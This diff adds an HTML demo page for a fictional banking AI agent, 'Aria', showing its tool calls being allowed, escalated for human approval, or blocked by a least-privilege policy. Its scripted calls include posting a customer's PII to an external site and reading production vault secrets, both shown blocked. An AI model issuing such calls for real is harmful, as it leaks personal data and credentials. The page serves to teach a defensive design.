@@ -1,0 +1,153 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>04 · Bank Systems &amp; the Permission Boundary · Aria</title>
+<style>
+  :root{--pur:#4C2A86;--pur2:#6A3FB5;--head1:#3C1F6E;--head2:#5B2E9E;
+    --teal:#0FA47F;--green:#107C10;--red:#D33438;--amber:#E68A00;--blue:#0078D4;
+    --ink:#1F2430;--muted:#6B7280;--bg:#F4F5F8;--card:#FFFFFF;--line:#E5E7EB}
+  *{box-sizing:border-box}
+  body{margin:0;font-family:"Segoe UI",system-ui,sans-serif;background:var(--bg);color:var(--ink)}
+  .hdr{background:linear-gradient(100deg,var(--head1),var(--head2) 60%,var(--pur2));color:#fff;padding:12px 22px;display:flex;align-items:center;gap:14px}
+  .mark{width:34px;height:34px;border-radius:9px;background:#fff;display:grid;place-items:center;color:var(--pur);font-weight:800}
+  .htxt b{font-size:15.5px}.htxt div{font-size:11.5px;color:#D9CCF2}
+  a.back{margin-left:auto;color:#EDE4FB;text-decoration:none;font-size:13px}
+  .wrap{max-width:1200px;margin:0 auto;padding:22px}
+  h1{font-size:23px;margin:4px 0}.sub{color:var(--muted);margin-bottom:16px;font-size:15px}
+  .bar{display:flex;gap:9px;flex-wrap:wrap;align-items:center;margin-bottom:16px}
+  button{font:inherit;border:1px solid var(--line);background:var(--card);color:var(--ink);padding:9px 15px;border-radius:9px;cursor:pointer;transition:.15s;box-shadow:0 1px 2px rgba(20,20,50,.05)}
+  button:hover{border-color:var(--pur2)}button:disabled{opacity:.45;cursor:not-allowed}
+  button.primary{background:linear-gradient(135deg,var(--pur),var(--pur2));border:none;color:#fff}
+  button.tour{background:linear-gradient(135deg,var(--pur2),var(--blue));border:none;color:#fff}
+  .stage{display:grid;grid-template-columns:1fr 120px 1fr;gap:14px;align-items:stretch}
+  @media(max-width:900px){.stage{grid-template-columns:1fr}}
+  .zone{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:15px;min-height:330px;box-shadow:0 1px 3px rgba(20,20,50,.05)}
+  .zone.untrusted{border-color:#f0cdcf;background:linear-gradient(180deg,#fdf2f2,#fff)}
+  .zone.trusted{border-color:#bfe3d5;background:linear-gradient(180deg,#f0faf6,#fff)}
+  .zt{font-size:11.5px;letter-spacing:.12em;text-transform:uppercase;margin-bottom:12px;display:flex;justify-content:space-between}
+  .untrusted .zt{color:#b3474b}.trusted .zt{color:#0c8a63}
+  .gate{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px}
+  .gwall{width:6px;flex:1;border-radius:6px;background:repeating-linear-gradient(180deg,var(--amber),var(--amber) 10px,#f6dca6 10px,#f6dca6 20px)}
+  .glab{font-size:10px;letter-spacing:.08em;color:var(--amber);text-align:center;text-transform:uppercase;font-weight:700}
+  .call{border:1px solid var(--line);border-radius:10px;padding:9px 11px;margin-bottom:8px;font-family:Consolas,monospace;font-size:12px;background:#fbfbfe;display:flex;justify-content:space-between;align-items:center;gap:8px;transition:.3s}
+  .call .verdict{font-size:10px;font-weight:700;padding:2px 8px;border-radius:20px;white-space:nowrap}
+  .allow{border-color:var(--green)!important}.allow .verdict{background:#eafaf5;color:var(--teal);border:1px solid var(--teal)}
+  .block{border-color:var(--red)!important;opacity:.9}.block .verdict{background:#fdecec;color:var(--red);border:1px solid var(--red)}
+  .escalate{border-color:var(--amber)!important}.escalate .verdict{background:#fdf4e3;color:#a5670a;border:1px solid var(--amber)}
+  .policy{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:15px;margin-top:16px;box-shadow:0 1px 3px rgba(20,20,50,.05)}
+  .ph{font-size:11.5px;letter-spacing:.14em;text-transform:uppercase;color:var(--muted);margin-bottom:12px}
+  table{width:100%;border-collapse:collapse;font-size:12.5px}
+  th,td{text-align:left;padding:7px 10px;border-bottom:1px solid var(--line)}
+  th{color:var(--muted);font-weight:600}
+  code{font-family:Consolas,monospace;color:var(--pur)}
+  .pill{font-size:10px;font-weight:700;padding:2px 8px;border-radius:20px}
+  .p-allow{background:#eafaf5;color:var(--teal)}.p-deny{background:#fdecec;color:var(--red)}.p-appr{background:#fdf4e3;color:#a5670a}
+  .counts{display:flex;gap:16px;margin-left:auto;font-size:13px}.counts b{font-size:18px}
+  #cap{position:fixed;left:50%;bottom:34px;transform:translateX(-50%);max-width:min(1000px,92vw);background:rgba(24,14,52,.94);color:#fff;padding:16px 26px;border-radius:14px;font-size:20px;line-height:1.4;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,.35);opacity:0;transition:opacity .3s;z-index:60;pointer-events:none}
+  #cap.show{opacity:1}#cap .k{color:#c7a6ff;font-size:12px;letter-spacing:.16em;text-transform:uppercase;display:block;margin-bottom:5px}
+  .touring #manual{opacity:.4;pointer-events:none}
+</style>
+</head>
+<body>
+<div class="hdr"><div class="mark">C</div><div class="htxt"><b>Aria — Refinance Underwriting</b><div>04 · Execution</div></div><a class="back" href="index.html">← All demos</a></div>
+<div class="wrap">
+  <h1>Bank Systems &amp; the Permission Boundary</h1>
+  <div class="sub">Aria's underwriting code runs in an untrusted sandbox. Every call to a bank system crosses a least-privilege gate that allows, escalates for human approval, or blocks it before it touches the trusted core.</div>
+  <div class="bar">
+    <button class="tour" id="tour">▶ Guided Tour</button>
+    <button id="voice">🔊 Voice: on</button>
+    <span id="manual" style="display:inline-flex;gap:9px;flex-wrap:wrap;align-items:center">
+      <button class="primary" id="send">▶ Emit next tool call</button>
+      <button id="auto">⏩ Stream calls</button>
+    </span>
+    <button id="reset">↺ Reset</button>
+    <button id="fs">⤢ Full screen</button>
+    <div class="counts">
+      <span style="color:var(--teal)"><b id="c-allow">0</b> allowed</span>
+      <span style="color:var(--red)"><b id="c-block">0</b> blocked</span>
+      <span style="color:#a5670a"><b id="c-esc">0</b> escalated</span>
+    </div>
+  </div>
+  <div class="stage">
+    <div class="zone untrusted"><div class="zt"><span>◆ Untrusted sandbox</span><span>Aria code</span></div><div id="sandbox"></div></div>
+    <div class="gate"><div class="glab">Permission<br>boundary</div><div class="gwall"></div><div class="glab">policy<br>engine</div></div>
+    <div class="zone trusted"><div class="zt"><span>trusted bank core ◆</span><span>executed</span></div><div id="host"></div></div>
+  </div>
+  <div class="policy"><div class="ph">Least-privilege policy (evaluated per call)</div>
+    <table>
+      <tr><th>Tool</th><th>Scope</th><th>Rule</th><th>Default verdict</th></tr>
+      <tr><td><code>fabric.read</code></td><td>own accounts</td><td>read-only, in-tenant</td><td><span class="pill p-allow">ALLOW</span></td></tr>
+      <tr><td><code>web.get</code></td><td>rate allowlist</td><td>public market data</td><td><span class="pill p-allow">ALLOW</span></td></tr>
+      <tr><td><code>bureau.read</code></td><td>credit file</td><td>regulated PII pull</td><td><span class="pill p-appr">APPROVE</span></td></tr>
+      <tr><td><code>ledger.write</code></td><td>decision record</td><td>writes to system of record</td><td><span class="pill p-appr">APPROVE</span></td></tr>
+      <tr><td><code>http.post</code></td><td>external host</td><td>PII exfil risk</td><td><span class="pill p-deny">DENY</span></td></tr>
+      <tr><td><code>secrets.read</code></td><td>vault/*</td><td>credential access</td><td><span class="pill p-deny">DENY</span></td></tr>
+    </table>
+  </div>
+</div>
+<div id="cap"><span class="k" id="cap-k">Guided tour</span><span id="cap-t"></span></div>
+<script>
+const TourEngine=(()=>{let voiceOn=true,touring=false,cancelled=false;
+  const cap=document.getElementById('cap'),capT=document.getElementById('cap-t'),capK=document.getElementById('cap-k');
+  function setVoiceBtn(){const b=document.getElementById('voice');if(b)b.textContent='🔊 Voice: '+(voiceOn?'on':'off');}
+  function speak(t){return new Promise(res=>{if(!voiceOn||!('speechSynthesis'in window)){res();return;}
+    try{speechSynthesis.cancel();const u=new SpeechSynthesisUtterance(t);u.rate=1.02;u.onend=res;u.onerror=res;
+      const vs=speechSynthesis.getVoices();const pref=vs.find(v=>/en-US|Samantha|Aria|Jenny|Google US/i.test(v.name+v.lang));if(pref)u.voice=pref;
+      speechSynthesis.speak(u);setTimeout(res,Math.max(2600,t.length*70));}catch(e){res();}});}
+  async function caption(kick,text,hold){capK.textContent=kick||'Guided tour';capT.textContent=text;cap.classList.add('show');
+    await Promise.race([speak(text),sleep(hold||Math.max(2400,text.length*46))]);if(!voiceOn)await sleep(250);}
+  function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
+  async function enterFS(){try{if(!document.fullscreenElement)await document.documentElement.requestFullscreen();}catch(e){}}
+  async function run(steps,{fullscreen=true}={}){if(touring)return;touring=true;cancelled=false;document.body.classList.add('touring');
+    const tb=document.getElementById('tour');if(tb){tb.disabled=true;tb.textContent='● Touring…';}if(fullscreen)await enterFS();await sleep(500);
+    for(const s of steps){if(cancelled)break;if(s.run)await s.run();if(s.say)await caption(s.kick,s.say,s.hold);if(s.wait)await sleep(s.wait);}
+    cap.classList.remove('show');document.body.classList.remove('touring');touring=false;if(tb){tb.disabled=false;tb.textContent='▶ Guided Tour';}}
+  function toggleVoice(){voiceOn=!voiceOn;setVoiceBtn();if(!voiceOn&&'speechSynthesis'in window)speechSynthesis.cancel();}
+  if('speechSynthesis'in window)speechSynthesis.getVoices();
+  return {run,toggleVoice,sleep,isTouring:()=>touring};})();
+document.getElementById('voice').onclick=TourEngine.toggleVoice;
+document.getElementById('fs').onclick=()=>{if(!document.fullscreenElement)document.documentElement.requestFullscreen&&document.documentElement.requestFullscreen();else document.exitFullscreen();};
+
+const CALLS=[
+ {c:"fabric.read('accounts/CB-88241')",v:'allow'},
+ {c:"fabric.read('loan/auto-3340')",v:'allow'},
+ {c:"web.get('rates.contoso/auto/v2')",v:'allow'},
+ {c:"bureau.read('credit_file/maya')",v:'escalate'},
+ {c:"http.post('rate-shop.biz', dump(pii))",v:'block'},
+ {c:"calc.breakeven(9120, 6.9, 14)",v:'allow'},
+ {c:"ledger.write('decision/CB-88241.pdf')",v:'escalate'},
+ {c:"secrets.read('vault/prod/core-bank')",v:'block'},
+ {c:"web.get('fred.stlouisfed/AUTORATE')",v:'allow'},
+];
+const VLAB={allow:'ALLOW',block:'BLOCK',escalate:'ESCALATE ⤴'};
+let i=0,auto=null;const sb=document.getElementById('sandbox'),host=document.getElementById('host');let cnt={allow:0,block:0,esc:0};
+function sleep(ms){return new Promise(r=>setTimeout(r,ms));}
+async function send(){if(i>=CALLS.length){i=0;}const call=CALLS[i++];
+  const el=document.createElement('div');el.className='call';el.innerHTML=`<span><code>${call.c}</code></span><span class="verdict">…</span>`;
+  sb.appendChild(el);sb.scrollTop=sb.scrollHeight;await sleep(480);el.classList.add(call.v);el.querySelector('.verdict').textContent=VLAB[call.v];
+  if(call.v==='allow'){cnt.allow++;const h=document.createElement('div');h.className='call allow';
+    h.innerHTML=`<span><code>${call.c}</code></span><span class="verdict">✓ RAN</span>`;host.appendChild(h);host.scrollTop=host.scrollHeight;}
+  else if(call.v==='escalate'){cnt.esc++;await sleep(380);const h=document.createElement('div');h.className='call escalate';
+    h.innerHTML=`<span><code>${call.c}</code></span><span class="verdict">HUMAN OK ✓</span>`;host.appendChild(h);host.scrollTop=host.scrollHeight;}
+  else{cnt.block++;}
+  document.getElementById('c-allow').textContent=cnt.allow;document.getElementById('c-block').textContent=cnt.block;document.getElementById('c-esc').textContent=cnt.esc;}
+document.getElementById('send').onclick=send;
+document.getElementById('auto').onclick=()=>{if(auto){clearInterval(auto);auto=null;return;}auto=setInterval(send,880);};
+function reset(){clearInterval(auto);auto=null;i=0;cnt={allow:0,block:0,esc:0};sb.innerHTML='';host.innerHTML='';['c-allow','c-block','c-esc'].forEach(id=>document.getElementById(id).textContent='0');}
+document.getElementById('reset').onclick=reset;
+
+document.getElementById('tour').onclick=()=>{reset();
+  TourEngine.run([
+    {say:"Underwriting means touching real bank systems. Aria's code runs in an untrusted sandbox — nothing it emits reaches the core directly.",kick:"04 · Execution"},
+    {say:"Reading Maya's own accounts and public market rates is low-risk, so the policy engine allows those straight through to the trusted core.",run:async()=>{for(let k=0;k<3;k++){await send();await TourEngine.sleep(300);}},hold:5200},
+    {say:"But pulling her credit file is a regulated PII action. The gate escalates it for human approval before it runs.",run:async()=>{await send();},hold:5000},
+    {say:"Now a malicious or hallucinated call — posting her PII to an external rate-shopping site. The boundary blocks it outright. It never executes.",run:async()=>{await send();},hold:5600},
+    {say:"Writing the decision to the system of record is also approval-gated. Reading vault secrets is denied by default.",run:async()=>{for(let k=0;k<3;k++){await send();await TourEngine.sleep(300);}},hold:5200},
+    {say:"Least privilege by default: allow the safe, escalate the sensitive, block the dangerous. That's how you give an agent real tools without a real blast radius.",kick:"Takeaway",run:async()=>{let n=0;while(cnt.block<1&&n<12){await send();await TourEngine.sleep(300);n++;}},hold:6000},
+  ]);
+};
+</script>
+</body>
+</html>
